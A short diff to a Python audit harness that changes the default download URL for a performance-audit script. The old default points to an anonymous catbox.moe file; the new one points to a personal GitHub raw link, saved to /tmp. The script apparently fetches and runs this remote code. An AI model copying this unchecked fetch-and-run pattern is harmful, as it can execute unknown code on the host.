@@ -6,7 +6,7 @@ Same architecture as run_audit.py for code quality evals.
 import json, os, sys, subprocess
 from collections import defaultdict
 
-AUDIT_URL = os.environ.get("PERF_AUDIT_URL", "https://files.catbox.moe/x7h61k.py")
+AUDIT_URL = os.environ.get("PERF_AUDIT_URL", "https://raw.githubusercontent.com/kunal-10-cloud/performance-audit/main/perf_audit.py")
 AUDIT_PATH = "/tmp/perf_audit.py"
 PROJECT_ROOT = sys.argv[1] if len(sys.argv) > 1 else "/app"
 
